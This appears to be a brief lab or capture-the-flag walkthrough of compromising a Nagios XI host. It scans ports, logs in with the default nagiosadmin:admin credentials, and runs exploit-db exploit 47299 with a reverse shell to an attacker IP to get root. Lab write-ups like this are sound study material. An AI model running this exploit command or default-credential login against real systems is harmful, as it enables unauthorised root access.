### Initial Foothold + Privesc
Run autorecon and nmap. Got port 22, 25, 80, 389, 443, 5667 and UDP port 162.
22 - nmap brute. Nothing.
25 - Not sure what to do with this. Ran `smtp-commands` and `smtp-open-relay`.
80 - nagiosxi
389 - LDAP 
443 - clone of 80.
5667 - Not sure what to do with this.
UDP 162 - SNMP agent. Nothing to do there.

Visit nagiosxi. Try default credentials: nagiosadmin:admin and entered page.
Found nagiosxi version 5.6.0. Search nagiosxi on exploitdb to find `47299.py`

Installed required PHP modules for exploit 47299:
```
sudo apt install php-curl
sudo apt install php-xml
```

Ran exploit against the target 
```
php 47299.php --host=192.168.145.136 --ssl=false --user=nagiosadmin --pass=admin --reverseip=192.168.45.220 --reverseport=4444
```
Directly obtain root.